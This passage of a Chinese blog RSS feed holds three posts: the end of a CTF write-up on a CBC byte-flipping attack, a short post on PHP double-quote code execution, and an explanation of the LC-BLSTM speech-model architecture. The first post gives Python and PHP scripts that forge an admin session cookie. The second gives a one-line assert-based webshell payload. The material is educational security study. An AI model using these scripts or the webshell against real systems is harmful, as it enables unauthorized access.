  &lt;span&gt;if&lt;/span&gt;(&lt;span&gt;$username&lt;/span&gt; === 'admin'){   &lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断网页提交的用户是否是真实的&quot;admin&quot;&lt;/span&gt;
        &lt;span&gt;exit&lt;/span&gt;('&amp;lt;p&amp;gt;You are not real admin!&amp;lt;/p&amp;gt;'&lt;span&gt;);
    }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
        &lt;/span&gt;&lt;span&gt;$info&lt;/span&gt; = &lt;span&gt;array&lt;/span&gt;('username'=&amp;gt;&lt;span&gt;$username&lt;/span&gt;,'password'=&amp;gt;&lt;span&gt;$password&lt;/span&gt;&lt;span&gt;);
        login(&lt;/span&gt;&lt;span&gt;$info&lt;/span&gt;&lt;span&gt;);
        show_homepage();
    }
}
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
  &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_SESSION&lt;/span&gt;[&quot;username&quot;&lt;span&gt;])){
        check_login();
        show_homepage();
    }
}
&lt;/span&gt;?&amp;gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;en&quot; &amp;gt;
&amp;lt;head&amp;gt;
  &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;
  &amp;lt;title&amp;gt;Paper login form&amp;lt;/title&amp;gt;
      &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
  &amp;lt;div id=&quot;login&quot;&amp;gt;
  &amp;lt;form action=&quot;&quot; method=&quot;post&quot;&amp;gt;
    &amp;lt;h1&amp;gt;Sign In&amp;lt;/h1&amp;gt;
    &amp;lt;input name='username' type=&quot;text&quot; placeholder=&quot;Username&quot;&amp;gt;
    &amp;lt;input name='password' type=&quot;password&quot; placeholder=&quot;Password&quot;&amp;gt;
    &amp;lt;button&amp;gt;Sign in&amp;lt;/button&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;代码审计发现用户只能够使用admin进行查询Flag，但是代码会检测出你不是真实的admin，所以需要利用网页代理对抓取的网页数据包进行两次不同的利用。&lt;/p&gt;
&lt;p&gt;第一次数据包的利用&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201903/1594459-20190325222438220-123360533.png&quot; alt=&quot;&quot; width=&quot;825&quot; height=&quot;242&quot;/&gt;&lt;/p&gt;
&lt;p&gt;由于刚开始用户的输入不能是admin所以提交用户名为&quot;ddmin&quot;，但是只有是admin用户才能查看Flag，所以只能利用代码上的提示：define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;); 利用 CBC 字节反转攻击构造admin。&lt;/p&gt;
&lt;p&gt;分析构造admin，明文分组16字节一组&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;原明文
a:2:{s:8:&quot;username&quot;;s:5:&quot;ddmin&quot;;s:8:&quot;password&quot;;s:5:&quot;12345&quot;}

明文分组
第一组：a:2:{s:8:&quot;userna
第二组：me&quot;;s:5:&quot;ddmin&quot;;
第三组：s:8:&quot;password&quot;;s
第四组：:5:&quot;12345&quot;;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;依据上述分组，通过修改第一组明文对应密文中的第10个字节来间接性修改第二组密文解密产生的明文，以此将&quot;ddmin&quot;修改为&quot;admin&quot;&lt;/p&gt;
&lt;p&gt;python 脚本~1&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; base64
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; urllib.parse

cipher &lt;/span&gt;= base64.b64decode(urllib.parse.unquote(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;mqyAyGTAv4dfyqwuz0mIu7HOBhqf9xStbNQgj4XKnnlIRBEc68i%2BV8hTS6IvQxYsEjzMBpMJO1s%2BFFmbw8jYxw%3D%3D&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;))  //这里放burp放回的base64的cipher数据
x &lt;/span&gt;= cipher[0:9]+bytes([ord(chr(cipher[9]))^ord(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;z&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)^ord(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;d&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)])+cipher[10&lt;span&gt;:]
x &lt;/span&gt;=&lt;span&gt; urllib.parse.quote(base64.b64encode(x))
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(x)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;php 脚本~1&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;header&lt;/span&gt;(&quot;Content-Type: text/html;charset=utf-8&quot;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;$cipher&lt;/span&gt; = &lt;span&gt;base64_decode&lt;/span&gt;(&lt;span&gt;urldecode&lt;/span&gt;('mqyAyGTAv4dfyqwuz0mIu7HOBhqf9xStbNQgj4XKnnlIRBEc68i%2BV8hTS6IvQxYsEjzMBpMJO1s%2BFFmbw8jYxw%3D%3D'&lt;span&gt;));  //这里放burp放回的base64的cipher数据
    &lt;/span&gt;&lt;span&gt;$temp&lt;/span&gt; = &lt;span&gt;$cipher&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;$cipher&lt;/span&gt;[9] = &lt;span&gt;chr&lt;/span&gt;(&lt;span&gt;ord&lt;/span&gt;(&lt;span&gt;$cipher&lt;/span&gt;[9]) ^ &lt;span&gt;ord&lt;/span&gt;('d') ^ &lt;span&gt;ord&lt;/span&gt;('a'&lt;span&gt;));
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &lt;span&gt;urlencode&lt;/span&gt;(&lt;span&gt;base64_encode&lt;/span&gt;(&lt;span&gt;$cipher&lt;/span&gt;&lt;span&gt;));
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;运行结果&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
mqyAyGTAv4dfz6wuz0mIu7HOBhqf9xStbNQgj4XKnnlIRBEc68i%2BV8hTS6IvQxYsEjzMBpMJO1s%2BFFmbw8jYxw%3D%3D
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;第二次数据包的利用&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201903/1594459-20190325234018246-1560459954.png&quot; alt=&quot;&quot; width=&quot;775&quot; height=&quot;254&quot;/&gt;&lt;/p&gt;
&lt;p&gt;将username和password提交的数据清空，并且将之前的 iv 和 修改过的cipher 添加到cookie字段中。 此处利用的主要代码如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201903/1594459-20190325234521257-1657095812.png&quot; alt=&quot;&quot; width=&quot;539&quot; height=&quot;267&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201903/1594459-20190325234614696-323702687.png&quot; alt=&quot;&quot; width=&quot;679&quot; height=&quot;201&quot;/&gt;&lt;/p&gt;
&lt;p&gt;对于发送的请求响应中看到对于密文解密出的明文反序列化失败，为了知道是怎么回事，我们将显示出来的base64代码进行解码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201903/1594459-20190325235027028-115000003.png&quot; alt=&quot;&quot; width=&quot;460&quot; height=&quot;221&quot;/&gt;&lt;/p&gt;
&lt;p&gt;从图中发现第一组的明文出现了问题，用户已经从&quot;ddmin&quot;成功修改为&quot;admin&quot;，由于&quot;第一次数据包利用&quot;中修改了第一组密文，所以第一组和第二组的明文都会受到影响。要想第一组明文恢复正常，就要在&quot;第一次数据包利用&quot;中的基础上修改IV使之产生正确的明文。&lt;/p&gt;
&lt;p&gt;python 脚本~2&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; -*- coding:utf8 -*-&lt;/span&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; base64
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; urllib.parse

cipher &lt;/span&gt;= base64.b64decode(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;+g9Uzo1waJpEYbdiV+DYOm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)  //&lt;span&gt;这里放burp放回的base64数据
iv &lt;/span&gt;= base64.b64decode(urllib.parse.unquote(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;tWgzNB61rHp%2BzFZCLB6KQA%3D%3D&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;))   //&lt;span&gt;这里放cookie中的iv
newiv &lt;/span&gt;= &lt;span&gt;''&lt;/span&gt;&lt;span&gt;
right &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;a:2:{s:8:&quot;userna&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;span&gt;for&lt;/span&gt; i &lt;span&gt;in&lt;/span&gt; range(16&lt;span&gt;):
    newiv &lt;/span&gt;+= chr(ord(right[i]) ^ ord(chr(iv[i])) ^&lt;span&gt; ord(chr(cipher[i])))      //产生新的向量IV

newiv &lt;/span&gt;= newiv.encode(encoding=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;utf8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(urllib.parse.quote(base64.b64encode(newiv)))
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;php 脚本~2&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;计算iv&lt;/span&gt;
    &lt;span&gt;$res&lt;/span&gt; = &lt;span&gt;base64_decode&lt;/span&gt;('+g9Uzo1waJpEYbdiV+DYOm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9');    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;这里放burp放回的base64数据&lt;/span&gt;
    &lt;span&gt;$iv&lt;/span&gt; = &lt;span&gt;base64_decode&lt;/span&gt;(&lt;span&gt;urldecode&lt;/span&gt;('tWgzNB61rHp%2BzFZCLB6KQA%3D%3D')); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;这里放cookie中的iv&lt;/span&gt;
    &lt;span&gt;$plaintext&lt;/span&gt; = 'a:2:{s:8:&quot;userna'&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;$new_iv&lt;/span&gt; = ''&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;$i&lt;/span&gt; = 0; &lt;span&gt;$i&lt;/span&gt; &amp;lt; 16; &lt;span&gt;$i&lt;/span&gt; ++&lt;span&gt;){
        &lt;/span&gt;&lt;span&gt;$new_iv&lt;/span&gt; = &lt;span&gt;$new_iv&lt;/span&gt; . &lt;span&gt;chr&lt;/span&gt;(&lt;span&gt;ord&lt;/span&gt;(&lt;span&gt;$iv&lt;/span&gt;[&lt;span&gt;$i&lt;/span&gt;]) ^ &lt;span&gt;ord&lt;/span&gt;(&lt;span&gt;$res&lt;/span&gt;[&lt;span&gt;$i&lt;/span&gt;]) ^ &lt;span&gt;ord&lt;/span&gt;(&lt;span&gt;$plaintext&lt;/span&gt;[&lt;span&gt;$i&lt;/span&gt;&lt;span&gt;]));  //产生新的向量IV
    }
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &lt;span&gt;urlencode&lt;/span&gt;(&lt;span&gt;base64_encode&lt;/span&gt;(&lt;span&gt;$new_iv&lt;/span&gt;&lt;span&gt;));
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;运行结果&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
Ll1VwOi2%2FtgAj5RTHow8Gw%3D%3D
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;重新发送第二次请求&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1594459/201903/1594459-20190326010543408-1707341522.jpg&quot; alt=&quot;&quot; width=&quot;792&quot; height=&quot;258&quot;/&gt;&lt;/p&gt;
&lt;p&gt;get flag&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
Flag is CBC{CBC is a good thing}
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;End，CBC 字节反转攻击的原理和知识已经讲述完结，有疑惑的朋友，欢迎大家相互交流。&lt;/p&gt;

</description>
<pubDate>Tue, 26 Mar 2019 07:24:00 +0000</pubDate>
<dc:creator>Pretty_girll</dc:creator>
<og:description>一、CBC 简介 现代密码体制 现代密码中的加密体制一般分为对称加密体制(Symmetric Key Encryption)和非对称加密体制(Asymmetric Key Encryption)。对称</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/prettygirll/p/10595591.html</dc:identifier>
</item>
<item>
<title>PHP中双引号引起的命令执行漏洞 - Yunen的博客</title>
<link>http://www.cnblogs.com/yunen/p/10600410.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yunen/p/10600410.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;在PHP语言中，单引号和双引号都可以表示一个字符串，但是对于双引号来说，可能会对引号内的内容进行二次解释，这就可能会出现安全问题。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;正文&quot;&gt;正文&lt;/h2&gt;
&lt;p&gt;举个简单例子&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?php
$a = 1;
$b = 2;
echo '$a$b';//输出结果为$a$b
echo &quot;$a$b&quot;;//输出结果为12
?&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到这两个输出的结果并不相同。&lt;/p&gt;&lt;p&gt;在双引号中倘若有${}出现，那么{}内的内容将被当做代码块来执行。&lt;br/&gt;&lt;img src=&quot;https://i.loli.net/2018/07/11/5b4621bf02bfa.png&quot;/&gt;&lt;br/&gt;可以看到成功执行了phpinfo()&lt;br/&gt;&lt;strong&gt;&lt;em&gt;&lt;br/&gt;试想一下，倘若在一个cms的后台，可以修改数据库的配置文件，且配置文件中的值用双引号包括，我们虽然也可以直接闭合代码达到getshell的后果，但是如果cms对传递的参数进行了addlashes()处理的话，我们就无法去闭合代码了，但这时我们可以传入${命令}就可以达到getshell的目的。&lt;br/&gt;&lt;/em&gt;&lt;/strong&gt;&lt;br/&gt;现在，让我们来修改一下代码，让我们不只能输出phpinfo&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?php echo &quot;${@assert($_POST[a])}&quot;;?&amp;gt; //@是用来防止输出错误信息的&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2018/07/11/5b4624108fe85.png&quot;/&gt;&lt;br/&gt;菜刀成功连接&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;本文简单记录了双引号可能会引发的代码执行的情况&lt;br/&gt;对于这种漏洞的防御，一定要明确单引号与双引号的区别所在，不要简单认为两者是互相可以替代的，在平时的代码书写中能只用单引号一定不要用双引号，毕竟单引号的解释时间也比双引号少得多，代码运行相对更快。&lt;/p&gt;
</description>
<pubDate>Tue, 26 Mar 2019 07:24:00 +0000</pubDate>
<dc:creator>Yunen的博客</dc:creator>
<og:description>前言 在PHP语言中，单引号和双引号都可以表示一个字符串，但是对于双引号来说，可能会对引号内的内容进行二次解释，这就可能会出现安全问题。 正文 举个简单例子 可以看到这两个输出的结果并不相同。 &lt;!</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yunen/p/10600410.html</dc:identifier>
</item>
<item>
<title>LC-BLSTM结构快速解读 - JeffreyLee</title>
<link>http://www.cnblogs.com/machine-lyc/p/10600300.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/machine-lyc/p/10600300.html</guid>
<description>&lt;p&gt;       &lt;strong&gt;前言&lt;/strong&gt;       众所周知，BLSTM是双向的LSTM，它可以同时兼容上下文的信息，从而在一般序列任务上的表现很好。但是BLSTM有一个很致命的弱点，那就是因为有逆向LSTM的存在，它需要有后文的后验，使得它无法在实时的序列任务上也有好的表现。基于实时任务的需求，出现了两种BLSTM的变体——&lt;strong&gt;CSC-BLSTM&lt;/strong&gt;和&lt;strong&gt;LC-BLSTM&lt;/strong&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;h3 id=&quot;csc-blstm结构解析&quot;&gt;1. CSC-BLSTM结构解析&lt;/h3&gt;
&lt;p&gt;       &lt;strong&gt;CSC-BLSTM&lt;/strong&gt;结构全名——Context-Sensitive-Chunk Bidirectional Long Short-Term Memory，是BLSTM的第一种改进版本。请看结构图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1274118/201903/1274118-20190326151447419-737207356.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;       CSC-BLSTM首先把序列按照图示的方法分割成多组&lt;strong&gt;chunk&lt;/strong&gt;，除了首尾位置，其他位置处的都是由&lt;strong&gt;N&lt;sub&gt;l&lt;/sub&gt;+N&lt;sub&gt;c&lt;/sub&gt;+N&lt;sub&gt;r&lt;/sub&gt;&lt;/strong&gt;构成，分割的大小事先给定，一般选做30帧+60帧+30帧的模式。&lt;/p&gt;
&lt;p&gt;       其核心思想在于，&lt;strong&gt;N&lt;sub&gt;l&lt;/sub&gt;&lt;/strong&gt;用来初始化&lt;strong&gt;N&lt;sub&gt;c&lt;/sub&gt;&lt;/strong&gt;的前向细胞层状态，&lt;strong&gt;N&lt;sub&gt;r&lt;/sub&gt;&lt;/strong&gt;用来初始化&lt;strong&gt;N&lt;sub&gt;c&lt;/sub&gt;&lt;/strong&gt;的后向细胞层状态。&lt;strong&gt;N&lt;sub&gt;l&lt;/sub&gt;&lt;/strong&gt;和&lt;strong&gt;N&lt;sub&gt;r&lt;/sub&gt;&lt;/strong&gt;不参与误差反向传播。如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1274118/201903/1274118-20190326151513992-2083787365.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;       很显然，CSC-BLSTM的这种结构改进可以减小实时任务的延迟，用不着整段话都输入完毕才有结果。但是从整体上看，它是以牺牲计算量为代价的。因为与BLSTM相比，它多出了&lt;strong&gt;N&lt;sub&gt;l&lt;/sub&gt;&lt;/strong&gt;和&lt;strong&gt;N&lt;sub&gt;r&lt;/sub&gt;&lt;/strong&gt;上的计算。在此基础之上，为了减少这种计算量，又出现了更加简化了的LC-BLSTM。&lt;/p&gt;
&lt;h3 id=&quot;lc-blstm结构解析&quot;&gt;2. LC-BLSTM结构解析&lt;/h3&gt;
&lt;p&gt;       &lt;strong&gt;LC-BLSTM&lt;/strong&gt;结构全名——Latency-Controlled Bidirectional Long Short-Term Memory，它改进了CSC-BLSTM。请看结构图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1274118/201903/1274118-20190326151527471-74441857.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;       可以发现，相比于CSC-BLSTM，LC-BLSTM取消了&lt;strong&gt;N&lt;sub&gt;l&lt;/sub&gt;&lt;/strong&gt;，只保留了&lt;strong&gt;N&lt;sub&gt;c&lt;/sub&gt;+N&lt;sub&gt;r&lt;/sub&gt;&lt;/strong&gt;。但是如此在计算上必然有差异。&lt;/p&gt;
&lt;p&gt;       原来，LC-BLSTM的计算也并不复杂，同CSC-BLSTM一样，&lt;strong&gt;N&lt;sub&gt;r&lt;/sub&gt;&lt;/strong&gt;用来初始化&lt;strong&gt;N&lt;sub&gt;c&lt;/sub&gt;&lt;/strong&gt;的后向细胞层状态。但是，&lt;strong&gt;N&lt;sub&gt;c&lt;/sub&gt;&lt;/strong&gt;的前向细胞层状态直接由它的前一个&lt;strong&gt;N&lt;sub&gt;c&lt;/sub&gt;&lt;/strong&gt;的输出状态得到。这样，相比于CSC-BLSTM，LC-BLSTM避免了&lt;strong&gt;N&lt;sub&gt;l&lt;/sub&gt;&lt;/strong&gt;的计算量。&lt;/p&gt;
&lt;p&gt;       &lt;strong&gt;But!!!&lt;/strong&gt;很不幸，通过实验发现，为了保证准确率，LC-BLSTM必须要保证&lt;strong&gt;N&lt;sub&gt;r&lt;/sub&gt;&lt;/strong&gt;划分的足够大，比如在原论文中，&lt;strong&gt;N&lt;sub&gt;c&lt;/sub&gt;&lt;/strong&gt;=22的情况下，&lt;strong&gt;N&lt;sub&gt;r&lt;/sub&gt;&lt;/strong&gt;需要有21，这几乎使得&lt;strong&gt;N&lt;sub&gt;r&lt;/sub&gt;&lt;/strong&gt;需要有&lt;strong&gt;N&lt;sub&gt;c&lt;/sub&gt;&lt;/strong&gt;同样的大小。在&lt;strong&gt;N&lt;sub&gt;c&lt;/sub&gt;&lt;/strong&gt;=&lt;strong&gt;N&lt;sub&gt;r&lt;/sub&gt;&lt;/strong&gt;=30的情况下，LC-BLSTM的计算量是传统BLSTM的两倍。&lt;/p&gt;
&lt;h3 id=&quot;改进的lc-blstm&quot;&gt;3. 改进的LC-BLSTM&lt;/h3&gt;
&lt;p&gt;       通过上述分析，LC-BLSTM的表现依然不好。阿里的研究人员改进了这个结构。他们总结LC-BLSTM的结构，多出来的计算量就在于&lt;strong&gt;N&lt;sub&gt;r&lt;/sub&gt;&lt;/strong&gt;，但是&lt;strong&gt;N&lt;sub&gt;r&lt;/sub&gt;&lt;/strong&gt;的作用无非两点：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;用于初始化当前&lt;strong&gt;N&lt;sub&gt;c&lt;/sub&gt;&lt;/strong&gt;的后向细胞状态；&lt;/li&gt;
&lt;li&gt;用做下一层网络的输入(因为正常都会使用多层BLSTM)&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;       于是作者分别采用了两种简化的网络结构代替&lt;strong&gt;N&lt;sub&gt;r&lt;/sub&gt;&lt;/strong&gt;的BLSTM结构。分别是&lt;strong&gt;LC-BLSTM-FABDI&lt;/strong&gt;和&lt;strong&gt;LC-BLSTM-FABSR&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&quot;lc-blstm-fabdi&quot;&gt;3.1 LC-BLSTM-FABDI&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1274118/201903/1274118-20190326151551985-1959588152.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;       首先对于时间轴上正向移动的LSTM，去掉了&lt;strong&gt;N&lt;sub&gt;r&lt;/sub&gt;&lt;/strong&gt;部分的计算。而对于时间轴上反向移动的LSTM，&lt;strong&gt;N&lt;sub&gt;r&lt;/sub&gt;&lt;/strong&gt;部分的计算主要是为&lt;strong&gt;N&lt;sub&gt;c&lt;/sub&gt;&lt;/strong&gt;提供cell的初始状态，作者简化了这部分的计算，使用正向全连接来代替LSTM，将f()的输出取平均后作为&lt;strong&gt;N&lt;sub&gt;c&lt;/sub&gt;&lt;/strong&gt;的初始状态。&lt;/p&gt;
&lt;h4 id=&quot;lc-blstm-fabsr&quot;&gt;3.2 LC-BLSTM-FABSR&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1274118/201903/1274118-20190326151605577-965828229.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;       首先对于时间轴上正向移动的LSTM，同样去掉了&lt;strong&gt;N&lt;sub&gt;r&lt;/sub&gt;&lt;/strong&gt;部分的计算。另外作者发现对于BLSTM模型，时间轴上反向传播的LSTM不如时间轴上正向传播的LSTM重要，因此使用简单RNN模型来代替时间轴上反向传播的LSTM。&lt;/p&gt;
&lt;p&gt;       但RNN会有梯度爆炸的问题，所以对其进行&lt;strong&gt;strict gradient-clipping&lt;/strong&gt;。同时为了利用未来的信息，加入了&lt;strong&gt;target delay&lt;/strong&gt;。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;作者在320小时的Switchboard数据集上进行测试，在不影响wer的情况下，这个两种方法的解码速度分别相对提升40%和27%。&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Tue, 26 Mar 2019 07:14:00 +0000</pubDate>
<dc:creator>JeffreyLee</dc:creator>
<og:description>&amp; 160; &amp; 160; &amp; 160; &amp; 160; 前言 &amp; 160; &amp; 160; &amp; 160; &amp; 160;众所周知，BLSTM是双向的LSTM，它可以同时兼容上下文的信息，从而在一般序列任务</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/machine-lyc/p/10600300.html</dc:identifier>
</item>
</channel>
</rss>